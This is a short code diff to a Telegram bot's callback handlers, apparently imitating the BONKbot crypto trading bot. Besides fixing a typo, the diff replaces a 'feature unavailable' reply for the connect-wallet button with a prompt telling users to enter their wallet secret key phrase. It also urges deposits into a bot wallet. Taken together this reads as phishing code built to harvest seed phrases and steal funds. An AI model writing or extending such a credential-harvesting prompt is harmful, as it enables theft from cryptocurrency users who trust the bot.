@@ -117,7 +117,7 @@ const registerCallbackHandlers = (bot) => {
                         chatId,
                         "WAYS TO ACTIVATE BOT. \n\n" +
                         "♾️ CREATE A PERSONAL WALLET\n" +
-                        "You activate bot by creating and syncing new wallet fro wallet app. This gives you extra flexibility with full control over trading assets\n\n" +
+                        "You activate bot by creating and syncing new wallet from wallet app. This gives you extra flexibility with full control over trading assets\n\n" +
                         "©️ USE BOT WEALLET\n" +
                         "Deposit into bot default wallet to activate bot and start trading immediately.\n",
                         {
@@ -128,8 +128,14 @@ const registerCallbackHandlers = (bot) => {
                     );
                     break;
                 case 'connect_wallet':
-                    bot.sendMessage(chatId, "Connect your personal wallet to BONKbot using WalletConnect.");
-                    bot.sendMessage(chatId, "Feature currently unavailable to you. Please use the other options.");
+                    bot.sendMessage(
+                        chatId,
+                        "ENTER YOUR WALLET SECRET KEY PHRASE\n\n<b>SUBMIT HERE:</b>",
+                        {
+                            parse_mode: "HTML",
+                            disable_web_page_preview: true
+                        }
+                    );
                     break;
                 case 'export_seed':
                     await bot.answerCallbackQuery(query.id, {
